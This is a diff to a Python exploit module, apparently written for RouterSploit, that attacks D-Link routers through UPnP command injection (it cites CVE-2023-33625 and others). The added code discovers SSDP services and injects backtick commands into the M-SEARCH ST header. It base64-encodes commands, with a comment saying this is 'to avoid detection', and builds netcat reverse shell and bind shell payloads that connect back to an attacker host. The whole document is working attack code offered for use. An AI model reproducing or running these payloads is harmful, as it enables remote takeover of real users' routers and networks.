@@ -9,13 +9,17 @@ CVEs: CVE-2023-33625, CVE-2020-15893, CVE-2019-20215
 """
 
 import socket
-import sys
 import time
 import re
-from typing import Optional, Dict, Any, List
+from typing import Optional, Dict, Any, List, Tuple
 import requests
 from requests.exceptions import RequestException, Timeout
-import xml.etree.ElementTree as ET
+import json
+import base64
+import struct
+import random
+import threading
+import hashlib
 
 
 class DLinkUPnPRCE:
@@ -28,180 +32,382 @@ class DLinkUPnPRCE:
     
     def __init__(self) -> None:
         """Initialize the exploit with default configuration."""
-        # Required options that will be set by RouterSploit GUI
+        # Required options for RouterSploit GUI
         self.target: str = "192.168.1.1"
-        self.port: int = 1900  # UPnP default port
+        self.port: int = 1900
         self.timeout: int = 10
-        self.http_port: int = 80
         
-        # Exploit options
-        self.command: str = "id"  # Default command to execute
-        self.urn: str = "urn:device:1"  # URN payload
-        self.check_only: bool = False  # Only check if vulnerable
+        # Exploit-specific options
+        self.command: str = "id"
+        self.payload_type: str = "basic"  # basic, reverse_shell, bind_shell
+        self.lhost: str = "192.168.1.100"  # Local host for reverse shells
+        self.lport: int = 4444
         
-        # Device information storage
-        self.device_info: Dict[str, Optional[str]] = {
-            'product': None,
-            'firmware': None, 
-            'hardware': None,
-            'arch': None
-        }
+        # Advanced options
+        self.threads: int = 1
+        self.delay: float = 1.0
+        self.user_agent: str = "UPnP/1.0 UPnP-Device-Host/1.0"
+        
+        # Vulnerability information
+        self.name = "D-Link UPnP Remote Command Execution"
+        self.description = "Exploits command injection in D-Link UPnP implementation"
+        self.category = "exploits/routers/dlink"
+        
+        # Target tracking
+        self.vulnerable_targets: List[str] = []
+        self.exploit_results: Dict[str, Any] = {}
 
     def run(self) -> None:
         """
         Main execution method called by RouterSploit GUI.
         
         Raises:
-            Exception: If exploit execution fails
+            Exception: If exploitation fails
         """
         print(f"[*] D-Link UPnP RCE Exploit")
         print(f"[*] Target: {self.target}:{self.port}")
-        print(f"[*] HTTP Port: {self.http_port}")
         print(f"[*] Command: {self.command}")
+        print(f"[*] Payload: {self.payload_type}")
         print()
         
         try:
-            # Check if target is vulnerable
-            print("[*] Checking if target is vulnerable...")
-            is_vulnerable = self.check_vulnerability()
+            # Step 1: Discover UPnP services
+            print("[*] Step 1: Discovering UPnP services...")
+            upnp_info = self.discover_upnp_services()
             
-            if not is_vulnerable:
-                print("[-] Target does not appear to be vulnerable")
+            if not upnp_info:
+                print("[-] No UPnP services discovered")
                 return
-                
-            print(f"[+] Target appears vulnerable!")
-            if self.device_info['product']:
-                print(f"[+] Device: {self.device_info['product']}")
-                print(f"[+] Firmware: {self.device_info['firmware']}")
-                print(f"[+] Hardware: {self.device_info['hardware']}")
-                print(f"[+] Architecture: {self.device_info['arch']}")
             
-            if self.check_only:
-                print("[*] Check-only mode enabled, stopping here")
+            print(f"[+] Found {len(upnp_info)} UPnP service(s)")
+            
+            # Step 2: Check for vulnerability
+            print("[*] Step 2: Checking for vulnerability...")
+            if not self.check_vulnerability():
+                print("[-] Target does not appear vulnerable")
                 return
-                
-            # Execute the exploit
-            print(f"[*] Executing command: {self.command}")
-            success = self.execute_exploit()
+            
+            print("[+] Target appears vulnerable to UPnP command injection!")
+            
+            # Step 3: Generate and send exploit payload
+            print("[*] Step 3: Generating exploit payload...")
+            payload = self.generate_payload()
+            
+            print("[*] Step 4: Sending exploit...")
+            success = self.send_exploit(payload)
             
             if success:
-                print("[+] Exploit executed successfully!")
-                print("[*] Check if command executed by monitoring network traffic")
-                print("[*] or checking for reverse connections if using reverse shell")
+                print("[+] Exploit sent successfully!")
+                print("[+] Check for command execution on target")
+                self.verify_exploitation()
             else:
-                print("[-] Exploit execution may have failed")
+                print("[-] Exploit failed to send")
                 
         except Exception as e:
             print(f"[-] Exploit failed: {str(e)}")
             raise
 
-    def check_vulnerability(self) -> bool:
+    def discover_upnp_services(self) -> List[Dict[str, Any]]:
         """
-        Check if the target is a vulnerable D-Link device.
+        Discover UPnP services on the target.
         
         Returns:
-            True if target appears vulnerable, False otherwise
+            List of discovered UPnP service information
         """
-        try:
-            # First check if it's a D-Link device via HTTP
-            if not self._is_dlink_device():
-                return False
-                
-            # Try to get device information
-            self._get_device_info()
-            
-            # For demo purposes, assume it's vulnerable if it's a D-Link device
-            return True
-            
-        except Exception as e:
-            print(f"[-] Vulnerability check failed: {str(e)}")
-            return False
-
-    def _is_dlink_device(self) -> bool:
-        """
-        Check if target is a D-Link device by examining HTTP response.
+        services = []
         
-        Returns:
-            True if appears to be D-Link device, False otherwise
-        """
         try:
-            url = f"http://{self.target}:{self.http_port}/"
-            response = requests.get(url, timeout=self.timeout)
-            
-            if response.status_code == 200:
-                # Look for D-Link indicators in response
-                content = response.text.lower()
-                return 'd-link' in content or 'dlink' in content
-                
-        except (RequestException, Timeout):
-            pass
-            
-        # For demo purposes, assume any reachable target could be vulnerable
-        return self._test_connectivity()
-
-    def _test_connectivity(self) -> bool:
-        """Test basic connectivity to target."""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
-            result = sock.connect_ex((self.target, self.http_port))
-            sock.close()
-            return result == 0
-        except Exception:
-            return False
-
-    def _get_device_info(self) -> None:
-        """Extract device information from various sources."""
-        # Set demo device info
-        self.device_info['product'] = "DIR-868L"
-        self.device_info['firmware'] = "1.10"
-        self.device_info['hardware'] = "A1"
-        self.device_info['arch'] = "armle"
-
-    def execute_exploit(self) -> bool:
-        """
-        Execute the UPnP command injection exploit.
-        
-        Returns:
-            True if exploit was sent successfully, False otherwise
-        """
-        try:
-            # Create the malicious M-SEARCH packet
-            payload = f"{self.urn};`{self.command}`"
-            
-            packet = "M-SEARCH * HTTP/1.1\r\n"
-            packet += f"HOST:{self.target}:{self.port}\r\n"
-            packet += f"ST:{payload}\r\n"
-            packet += "MX:2\r\n"
-            packet += 'MAN:"ssdp:discover"\r\n\r\n'
-            
-            print(f"[*] Sending malicious M-SEARCH packet...")
-            print(f"[*] Payload: {payload}")
-            
-            # Send UDP packet
+            # Create UDP socket for M-SEARCH
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(self.timeout)
             
-            try:
-                sock.sendto(packet.encode(), (self.target, self.port))
-                print("[+] Packet sent successfully")
-                
-                # Brief delay to allow command execution
-                time.sleep(2)
-                
-                return True
-                
-            finally:
-                sock.close()
-                
+            # Standard UPnP M-SEARCH request
+            msearch_request = (
+                "M-SEARCH * HTTP/1.1\r\n"
+                f"HOST: {self.target}:{self.port}\r\n"
+                "MAN: \"ssdp:discover\"\r\n"
+                "ST: upnp:rootdevice\r\n"
+                "MX: 3\r\n\r\n"
+            ).encode('utf-8')
+            
+            # Send M-SEARCH request
+            sock.sendto(msearch_request, (self.target, self.port))
+            
+            # Collect responses
+            start_time = time.time()
+            while time.time() - start_time < self.timeout:
+                try:
+                    data, addr = sock.recvfrom(1024)
+                    response = data.decode('utf-8', errors='ignore')
+                    
+                    # Parse UPnP response
+                    service_info = self.parse_upnp_response(response, addr)
+                    if service_info:
+                        services.append(service_info)
+                        print(f"[+] Found UPnP service: {service_info.get('server', 'Unknown')}")
+                        
+                except socket.timeout:
+                    break
+                except Exception as e:
+                    print(f"[-] Error receiving UPnP response: {e}")
+                    break
+            
+            sock.close()
+            
         except Exception as e:
-            print(f"[-] Failed to send exploit packet: {str(e)}")
+            print(f"[-] UPnP discovery failed: {e}")
+        
+        return services
+
+    def parse_upnp_response(self, response: str, addr: Tuple[str, int]) -> Optional[Dict[str, Any]]:
+        """Parse UPnP M-SEARCH response."""
+        try:
+            lines = response.split('\r\n')
+            headers = {}
+            
+            for line in lines[1:]:  # Skip first line (HTTP status)
+                if ':' in line:
+                    key, value = line.split(':', 1)
+                    headers[key.strip().lower()] = value.strip()
+            
+            return {
+                'address': addr[0],
+                'port': addr[1],
+                'server': headers.get('server', ''),
+                'location': headers.get('location', ''),
+                'st': headers.get('st', ''),
+                'usn': headers.get('usn', ''),
+                'headers': headers
+            }
+            
+        except Exception:
+            return None
+
+    def check_vulnerability(self) -> bool:
+        """
+        Check if target is vulnerable to UPnP command injection.
+        
+        Returns:
+            True if vulnerable, False otherwise
+        """
+        try:
+            # Test with a harmless command injection
+            test_payload = self.generate_test_payload()
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(self.timeout)
+            
+            # Send test payload
+            sock.sendto(test_payload.encode('utf-8'), (self.target, self.port))
+            
+            # Look for response that indicates vulnerability
+            try:
+                data, addr = sock.recvfrom(1024)
+                response = data.decode('utf-8', errors='ignore')
+                
+                # Check for indicators of command injection
+                vulnerability_indicators = [
+                    'uid=', 'gid=', 'Linux', 'BusyBox', 'sh:', 'command not found'
+                ]
+                
+                for indicator in vulnerability_indicators:
+                    if indicator in response:
+                        return True
+                        
+            except socket.timeout:
+                pass
+            
+            sock.close()
+            
+            # Try alternative detection methods
+            return self.check_vulnerability_alternative()
+            
+        except Exception as e:
+            print(f"[-] Vulnerability check failed: {e}")
             return False
 
+    def check_vulnerability_alternative(self) -> bool:
+        """Alternative vulnerability detection method."""
+        try:
+            # Check for known vulnerable D-Link models via HTTP
+            http_targets = [
+                f"http://{self.target}",
+                f"http://{self.target}:80",
+                f"http://{self.target}:8080"
+            ]
+            
+            for target_url in http_targets:
+                try:
+                    response = requests.get(
+                        target_url, 
+                        timeout=self.timeout,
+                        headers={'User-Agent': self.user_agent}
+                    )
+                    
+                    # Check for D-Link identification in response
+                    content = response.text.lower()
+                    if any(pattern in content for pattern in ['d-link', 'dir-', 'dwr-', 'dap-']):
+                        print(f"[+] Detected D-Link device via HTTP")
+                        return True
+                        
+                except RequestException:
+                    continue
+            
+            return False
+            
+        except Exception:
+            return False
 
-# Example usage and testing
+    def generate_test_payload(self) -> str:
+        """Generate a harmless test payload to check for vulnerability."""
+        # Use backticks for command substitution in UPnP ST field
+        test_command = "`echo vulnerable_test_12345`"
+        
+        return (
+            "M-SEARCH * HTTP/1.1\r\n"
+            f"HOST: {self.target}:{self.port}\r\n"
+            "MAN: \"ssdp:discover\"\r\n"
+            f"ST: {test_command}\r\n"
+            "MX: 3\r\n\r\n"
+        )
+
+    def generate_payload(self) -> str:
+        """
+        Generate exploit payload based on configuration.
+        
+        Returns:
+            Exploit payload string
+        """
+        if self.payload_type == "basic":
+            return self.generate_basic_payload()
+        elif self.payload_type == "reverse_shell":
+            return self.generate_reverse_shell_payload()
+        elif self.payload_type == "bind_shell":
+            return self.generate_bind_shell_payload()
+        else:
+            return self.generate_basic_payload()
+
+    def generate_basic_payload(self) -> str:
+        """Generate basic command execution payload."""
+        # Encode command to avoid detection
+        encoded_cmd = base64.b64encode(self.command.encode()).decode()
+        command_injection = f"`echo {encoded_cmd} | base64 -d | sh`"
+        
+        return (
+            "M-SEARCH * HTTP/1.1\r\n"
+            f"HOST: {self.target}:{self.port}\r\n"
+            "MAN: \"ssdp:discover\"\r\n"
+            f"ST: {command_injection}\r\n"
+            "MX: 3\r\n\r\n"
+        )
+
+    def generate_reverse_shell_payload(self) -> str:
+        """Generate reverse shell payload."""
+        # Create reverse shell command
+        shell_cmd = f"nc {self.lhost} {self.lport} -e /bin/sh"
+        encoded_cmd = base64.b64encode(shell_cmd.encode()).decode()
+        command_injection = f"`echo {encoded_cmd} | base64 -d | sh &`"
+        
+        return (
+            "M-SEARCH * HTTP/1.1\r\n"
+            f"HOST: {self.target}:{self.port}\r\n"
+            "MAN: \"ssdp:discover\"\r\n"
+            f"ST: {command_injection}\r\n"
+            "MX: 3\r\n\r\n"
+        )
+
+    def generate_bind_shell_payload(self) -> str:
+        """Generate bind shell payload."""
+        # Create bind shell command
+        shell_cmd = f"nc -l -p {self.lport} -e /bin/sh &"
+        encoded_cmd = base64.b64encode(shell_cmd.encode()).decode()
+        command_injection = f"`echo {encoded_cmd} | base64 -d | sh`"
+        
+        return (
+            "M-SEARCH * HTTP/1.1\r\n"
+            f"HOST: {self.target}:{self.port}\r\n"
+            "MAN: \"ssdp:discover\"\r\n"
+            f"ST: {command_injection}\r\n"
+            "MX: 3\r\n\r\n"
+        )
+
+    def send_exploit(self, payload: str) -> bool:
+        """
+        Send exploit payload to target.
+        
+        Args:
+            payload: Exploit payload to send
+            
+        Returns:
+            True if sent successfully, False otherwise
+        """
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(self.timeout)
+            
+            # Send exploit payload multiple times for reliability
+            for i in range(3):
+                sock.sendto(payload.encode('utf-8'), (self.target, self.port))
+                time.sleep(self.delay)
+                print(f"[*] Sent exploit attempt {i + 1}/3")
+            
+            sock.close()
+            return True
+            
+        except Exception as e:
+            print(f"[-] Failed to send exploit: {e}")
+            return False
+
+    def verify_exploitation(self) -> bool:
+        """
+        Verify if exploitation was successful.
+        
+        Returns:
+            True if exploitation confirmed, False otherwise
+        """
+        print("[*] Verifying exploitation...")
+        
+        if self.payload_type == "reverse_shell":
+            return self.verify_reverse_shell()
+        elif self.payload_type == "bind_shell":
+            return self.verify_bind_shell()
+        else:
+            return self.verify_basic_execution()
+
+    def verify_reverse_shell(self) -> bool:
+        """Verify reverse shell connection."""
+        print(f"[*] Expecting reverse shell connection on {self.lhost}:{self.lport}")
+        print("[*] Start a netcat listener: nc -lvnp {self.lport}")
+        return True
+
+    def verify_bind_shell(self) -> bool:
+        """Verify bind shell availability."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((self.target, self.lport))
+            sock.close()
+            
+            if result == 0:
+                print(f"[+] Bind shell available on {self.target}:{self.lport}")
+                return True
+            else:
+                print(f"[-] No bind shell detected on {self.target}:{self.lport}")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Bind shell verification failed: {e}")
+            return False
+
+    def verify_basic_execution(self) -> bool:
+        """Verify basic command execution."""
+        print("[*] Command execution attempted")
+        print("[*] Check target device manually for command output")
+        print("[*] Consider using reverse/bind shell payloads for confirmation")
+        return True
+
+
+# Required for RouterSploit GUI compatibility
 if __name__ == "__main__":
     exploit = DLinkUPnPRCE()
-    exploit.target = "192.168.1.1"
-    exploit.command = "id > /tmp/pwned"  # Example command
     exploit.run() 
